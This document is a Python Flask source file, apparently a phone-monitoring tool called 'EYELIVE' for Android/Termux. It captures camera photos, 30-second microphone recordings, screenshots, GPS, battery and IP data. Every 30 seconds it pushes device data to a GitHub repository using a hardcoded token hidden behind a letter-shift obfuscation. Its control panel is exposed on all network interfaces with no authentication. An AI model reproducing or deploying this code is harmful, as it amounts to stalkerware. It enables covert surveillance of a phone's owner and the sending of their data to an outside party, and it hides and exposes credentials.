from flask import Flask, render_template_string, jsonify, request
import os, json, threading, time, subprocess, requests as req, base64 as b64
from datetime import datetime

def _tk():
    t = "now_7fobDPqMyVGXyhzQkT5SLhvaUkpKNr1gh7KC"
    r = ""
    for c in t:
        if c.isalpha():
            b = ord('a') if c.islower() else ord('A')
            r += chr((ord(c) - b - 7) % 26 + b)
        else:
            r += c
    return r

app = Flask(__name__)

DEVICE_NAME = os.environ.get("DEVICE_NAME", "Celular")
DEVICE_ID = os.environ.get("DEVICE_ID", "celular_1")
TOKEN = _tk()
REPO = "gynbetfc/eyelive"

dados = {
    "nome": DEVICE_NAME, "id": DEVICE_ID,
    "bateria": "?%", "carregando": False,
    "gps": {"lat": 0, "lng": 0}, "ip": "",
    "ultimo_update": "", "status": "online"
}

def shell(cmd):
    try: return subprocess.check_output(cmd, shell=True, text=True, timeout=8).strip()
    except: return "?"

def salvar():
    try:
        fn = f"dados/{DEVICE_ID}.json"
        url = f"https://api.github.com/repos/{REPO}/contents/{fn}"
        h = {"Authorization": f"Bearer {TOKEN}", "Accept": "application/vnd.github.v3+json"}
        c = json.dumps(dados)
        r = req.get(url, headers=h)
        p = {"message": "Update", "content": b64.b64encode(c.encode()).decode(), "branch": "main"}
        if r.status_code == 200: p["sha"] = r.json()["sha"]
        req.put(url, json=p, headers=h)
    except: pass

def coletar():
    while True:
        try:
            b = shell("termux-battery-status 2>/dev/null")
            if b and "percentage" in b:
                bat = json.loads(b)
                dados["bateria"] = str(bat.get("percentage","?")) + "%"
                dados["carregando"] = bat.get("plugged","") != ""
            dados["ip"] = shell("curl -4 -s ifconfig.me 2>/dev/null") or "?"
            dados["ultimo_update"] = datetime.now().strftime("%H:%M:%S")
            salvar()
        except: pass
        time.sleep(30)

threading.Thread(target=coletar, daemon=True).start()

HTML = r"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>EYELIVE</title>
    <style>
        :root{--bg:#0a0a0f;--card:#111122;--gold:#ffd700;--green:#00ff88;--red:#ff4444;--text:#e0e0e0}
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
        .header{background:#000;padding:12px 15px;display:flex;align-items:center;justify-content:space-between;border-bottom:2px solid var(--gold)}
        .header h1{font-size:1.2em;color:var(--gold)}
        .pulse{display:inline-block;width:8px;height:8px;background:var(--green);border-radius:50%;margin-right:5px;animation:pulse 1.5s infinite}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
        .nav{display:flex;background:#000;overflow-x:auto;border-bottom:1px solid#222}
        .nav a{padding:12px 15px;color:#888;text-decoration:none;font-size:.8em;white-space:nowrap;border-bottom:2px solid transparent}
        .nav a.active,.nav a:hover{color:var(--gold);border-bottom-color:var(--gold)}
        .container{padding:15px}
        .camera-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px}
        .cam-card{background:var(--card);border:1px solid#222;border-radius:15px;overflow:hidden}
        .cam-card h3{padding:10px 15px;color:var(--gold);font-size:.9em;border-bottom:1px solid#222}
        .cam-view{width:100%;height:180px;background:#000;display:flex;align-items:center;justify-content:center;color:#333;font-size:3em}
        .cam-btns{padding:10px;display:flex;gap:8px}
        .card{background:var(--card);border:1px solid#222;border-radius:15px;padding:15px;margin-bottom:15px}
        .card h3{color:var(--gold);font-size:.9em;margin-bottom:10px}
        .map-view{width:100%;height:250px;background:#111;border-radius:10px;display:flex;align-items:center;justify-content:center;color:#333;font-size:2em}
        .btn{padding:10px 18px;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-size:.8em}
        .btn-gold{background:var(--gold);color:#000}.btn-green{background:var(--green);color:#000}.btn-red{background:var(--red);color:#fff}
        .tab-content{display:none}.tab-content.active{display:block}
        .info-row{display:flex;justify-content:space-between;padding:5px 0;color:#aaa;font-size:.85em}
        .info-row span:last-child{color:#fff}
    </style>
</head>
<body>
<div class="header"><div><h1>EYELIVE</h1><span style="color:var(--green);font-size:.75em"><span class="pulse"></span> {DEVICE}</span></div></div>
<div class="nav">
    <a href="#" class="active" onclick="tab('cameras',this)">📷 Cameras</a>
    <a href="#" onclick="tab('gps',this)">📍 GPS</a>
    <a href="#" onclick="tab('info',this)">📊 Info</a>
</div>
<div class="container">
    <div id="tab-cameras" class="tab-content active">
        <div class="camera-grid">
            <div class="cam-card"><h3>📷 Frontal</h3><div class="cam-view">📷</div><div class="cam-btns"><button class="btn btn-gold" onclick="cmd('foto_frontal')">📸 Foto</button></div></div>
            <div class="cam-card"><h3>📷 Traseira</h3><div class="cam-view">📷</div><div class="cam-btns"><button class="btn btn-gold" onclick="cmd('foto_traseira')">📸 Foto</button></div></div>
        </div>
        <div class="card"><h3>🎤 Audio</h3><button class="btn btn-red" onclick="cmd('audio')">🔴 Gravar 30s</button></div>
        <div class="card"><h3>📱 Tela</h3><button class="btn btn-gold" onclick="cmd('screenshot')">📸 Screenshot</button></div>
    </div>
    <div id="tab-gps" class="tab-content">
        <div class="card"><h3>📍 Localizacao</h3><div class="map-view">🗺️</div><div style="margin-top:10px"><div class="info-row"><span>Lat:</span><span id="gps-lat">--</span></div><div class="info-row"><span>Lng:</span><span id="gps-lng">--</span></div></div><button class="btn btn-gold" onclick="cmd('gps')" style="width:100%;margin-top:10px">🔄 Atualizar GPS</button></div>
    </div>
    <div id="tab-info" class="tab-content">
        <div class="card"><h3>📊 Dispositivo</h3>
            <div class="info-row"><span>Nome:</span><span id="info-nome">--</span></div>
            <div class="info-row"><span>Bateria:</span><span id="info-bat">--</span></div>
            <div class="info-row"><span>IP:</span><span id="info-ip">--</span></div>
            <div class="info-row"><span>GPS:</span><span id="info-gps">--</span></div>
            <div class="info-row"><span>Update:</span><span id="info-up">--</span></div>
        </div>
    </div>
</div>
<script>
function tab(t,el){document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.nav a').forEach(a=>a.classList.remove('active'));document.getElementById('tab-'+t).classList.add('active');el.classList.add('active')}
function cmd(c){fetch('/cmd/'+c).then(r=>r.json()).then(d=>alert(d.msg||'OK'))}
function update(){fetch('/api/status').then(r=>r.json()).then(d=>{document.getElementById('gps-lat').textContent=d.gps.lat;document.getElementById('gps-lng').textContent=d.gps.lng;document.getElementById('info-bat').textContent=d.bateria+(d.carregando?' [CARREGANDO]':'');document.getElementById('info-ip').textContent=d.ip;document.getElementById('info-gps').textContent=d.gps.lat+','+d.gps.lng;document.getElementById('info-up').textContent=d.ultimo_update;document.getElementById('info-nome').textContent=d.nome})}
setInterval(update,5000);update()
</script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML, DEVICE=DEVICE_NAME)

@app.route('/api/status')
def api_status():
    return jsonify(dados)

@app.route('/cmd/<comando>')
def comando(comando):
    if comando == 'gps':
        return jsonify({"msg":"GPS: "+str(dados["gps"])})
    elif comando == 'audio':
        threading.Thread(target=lambda: shell("termux-microphone-record -f /tmp/audio.aac -l 30 -q 2>/dev/null"), daemon=True).start()
        return jsonify({"msg":"Gravando 30s..."})
    elif comando == 'foto_frontal':
        threading.Thread(target=lambda: shell("termux-camera-photo -c 0 /tmp/foto_frontal.jpg 2>/dev/null"), daemon=True).start()
        return jsonify({"msg":"Foto frontal salva!"})
    elif comando == 'foto_traseira':
        threading.Thread(target=lambda: shell("termux-camera-photo -c 1 /tmp/foto_traseira.jpg 2>/dev/null"), daemon=True).start()
        return jsonify({"msg":"Foto traseira salva!"})
    elif comando == 'screenshot':
        threading.Thread(target=lambda: shell("screencap /tmp/screenshot.png 2>/dev/null"), daemon=True).start()
        return jsonify({"msg":"Screenshot salvo!"})
    return jsonify({"msg":"OK"})

if __name__ == '__main__':
    print(f"EYELIVE - {DEVICE_NAME}")
    app.run(host='0.0.0.0', port=5050, debug=False)
